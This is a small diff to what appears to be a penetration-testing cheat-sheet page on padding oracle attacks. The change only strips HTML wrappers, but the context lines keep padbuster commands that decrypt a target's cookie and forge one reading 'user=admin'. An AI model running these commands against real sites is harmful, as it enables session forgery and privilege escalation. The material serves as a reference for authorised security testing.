@@ -9,8 +9,6 @@ tags: ["padding oracle", "padbuster", "aes", "cbc", "cipher", "encryption"]
 {{< tab set1 tab1 active >}}padbuster{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 # 8 or 16     : block size
 # encoding 0  : base64
@@ -22,10 +20,6 @@ padbuster http://<TARGET>/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COO
 padbuster http://<TARGET>/index.php <COOKIE_VALUE> 8 -cookies <COOKIE_NAME>=<COOKIE_VALUE> -encoding 0 -plaintext user=admin
 ```
 
-</div>
-
 {{< /tabcontent >}}
 
 <small>*Ref: [Download padbuster](https://github.com/AonCyberLabs/PadBuster)*</small>
-
-<br>
